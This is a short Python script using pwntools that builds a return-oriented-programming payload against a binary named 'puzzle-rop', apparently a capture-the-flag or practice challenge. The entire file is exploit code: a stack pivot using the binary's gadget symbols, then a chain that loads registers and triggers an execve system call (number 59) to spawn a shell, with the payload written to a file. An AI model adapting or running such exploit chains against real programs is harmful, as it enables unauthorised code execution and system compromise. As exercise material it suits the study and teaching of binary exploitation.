from pwn import *

elf = ELF("../src/puzzle-rop")


def addr(s):
    return p64(elf.symbols[s])

# stack pivot
payload = b""
payload += addr("g_dead0a") # rdi+0x0
payload += addr("g_102938") # rdi+0x8
payload += addr("g_dead05") # rdi+0x10
payload += p64(0)

payload += addr("pop_rdi_ret")
payload += p64(0x000000000402024)
payload += addr("pop_rax_ret")
payload += p64(0x0)
payload += addr("xchg_rax_rdx_ret")
payload += addr("pop_rax_ret")
payload += p64(59)
payload += addr("pop_rsi_ret")
payload += p64(0)
payload += addr("syscall_ret")
payload += b"A"*0x20
with open("pay","wb") as f:
    f.write(payload)
